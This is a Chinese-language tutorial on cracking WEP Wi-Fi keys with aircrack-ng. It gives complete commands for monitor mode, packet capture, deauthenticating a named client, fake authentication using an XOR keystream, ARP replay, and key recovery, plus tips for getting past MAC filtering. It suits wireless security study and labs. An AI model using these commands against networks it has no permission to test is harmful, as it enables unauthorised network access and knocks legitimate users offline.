# WEP共享密钥破解

## 0x01 原理
+ IV并非完全随机
+ 每224个包可能出现一次IV重用
+ 收集大量IV之后找到相同IV及其对应密码文，分析得出共享密码
+ ARP回包中包含IV
+ IV足够多的情况下，理论上,任何复杂程度的wep密码都可以被破解

## 0x02 破解实践
### 步骤
1. WEP共享密钥破解                 
2. 启动monitor模式                 
3. 启动抓包并保存抓包              
4. Deauthentication抓包XOR文件     
5. 利用XOR文件与AP建立关联         
6. 执行ARP重放                     
7. Deauthenticiation触发ARP数据包  
8. 收集足够DATA之后破解密码 

### 实践
+ 启动monitor模式

```
airmon-ng start wlan2
```

+ 启动抓包并保存抓包 


```
airodump-ng wlan0mon
airodump-ng -c 11 --bssid EC:26:CA:DC:29:B6 -w wep wlan2mon
```

+ Deauthentication抓包XOR文件


```
aireplay-ng -0 1 -a EC:26:CA:DC:29:B6 -C 68:3E:34:30:0F:AA wlan2mon   //解除关联关系
```

+ 利用XOR文件与AP建立关联


```
cat wep-01-EC-26-CA-DC-29-86.xor    //查看的是一个密文

aireplay-ng -1 60 -e kifi -y wep-01-EC-26-CA-DC-29-86.xor -a EC:26:CA:DC:29:B6 -h 08-57-00-0C-96-68 wlan2mon  // 使用第一种注入方式，每60秒发一次authentication进行身份认证，关联目标wifiBSSID，密钥流，AP,本机网卡的manage地址
```

+ 执行ARP重放 


```
aireplay-ng -3 -b EC:26:CA:DC:29:B6 -h 08:57:00:0C:96:68 wlan2mon
```

+ Deauthenticiation触发ARP数据包


```
aireplay-ng -0 2 -a EC:26:CA:DC:29:B6 -c 68:3E:34:30:0F:AA wlanmon  //把客户端打掉然后重连
```

+ 收集足够DATA之后破解密码


```
aircrack-ng wep-01.cap
```

### 补充
#### FAKE AUTHENTICATION 
> WEP破解首先需要伪造认证，以便于AP进行正常通信 

+ 不产生ARP数据包

```
aireplay-ng -1 0 -e kifi -a <AP MAC> -h <Your MAC> <interface>

aireplay-ng -1 60 -0 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC><interface>

每60000毫秒发送reauthenticiation 
-o 1 每次身份认证只发一组认证数据 
-q 10 每10秒发keep-live帧
```
+  某些AP验证客户端MAC地址OUI (前三个字节)
+ MAC地址过滤 (使用macchanger)
+ Denied (Code 1) is WPA in use
  > WPA/WPA2不支持Fake authentication
+ 排错
  - 使用真实MAC地址
  - 物理足够接近被攻击者 
  - 与被攻击者使用相同无线标准b、n、g
  - 客户端可能拒绝广播帧，建议制定客户端

#### ARP重放
> 侦听正常的ARP包并重放给AP, AP回包中包含大量弱IV 

```
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
```

#### 破解所需iv(data字段数量)
##### 理想状态
+ 64bit密钥: 25万 
+ 128bit密钥: 150万  
+ 可以一边抓包一边破解, 可能就飞快破解出来了.
